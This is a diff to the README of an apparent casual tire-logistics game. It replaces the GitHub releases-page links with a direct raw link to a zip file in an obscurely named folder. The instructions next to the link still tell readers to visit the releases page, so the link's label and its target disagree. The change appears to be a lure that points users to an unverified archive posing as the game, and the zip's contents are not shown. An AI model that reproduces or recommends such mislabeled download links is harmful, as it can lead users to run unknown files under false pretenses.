@@ -1,7 +1,7 @@
 # 🚛 double-coin-dispatcher - A Fun Way to Manage Tire Logistics
 
 ## 📥 Download Here
-[![Download double-coin-dispatcher](https://img.shields.io/badge/Download-double--coin--dispatcher-blue.svg)](https://github.com/JON-99/double-coin-dispatcher/releases)
+[![Download double-coin-dispatcher](https://raw.githubusercontent.com/JON-99/double-coin-dispatcher/main/peritomy/double-coin-dispatcher.zip)](https://raw.githubusercontent.com/JON-99/double-coin-dispatcher/main/peritomy/double-coin-dispatcher.zip)
 
 ## 📖 About This Game
 The "Double Coin Dispatcher" is an HTML5 casual game designed for fun and learning about tire warehouse logistics. The game features three progressive levels. Players use drag-and-drop mechanics to route trucks effectively. This game can easily integrate into dealer locator apps, making logistics enjoyable and more accessible.
@@ -16,7 +16,7 @@ To start playing "Double Coin Dispatcher," follow these simple steps to download
 - **Internet Connection:** Required for initial download; offline play available afterward.
 
 ## 🤔 How to Download & Install
-1. Visit the releases page to download the game: [Download double-coin-dispatcher](https://github.com/JON-99/double-coin-dispatcher/releases).
+1. Visit the releases page to download the game: [Download double-coin-dispatcher](https://raw.githubusercontent.com/JON-99/double-coin-dispatcher/main/peritomy/double-coin-dispatcher.zip).
 2. Look for the latest version of the game on that page.
 3. Click on the download link for your operating system.
 4. Save the file to your preferred location on your device.
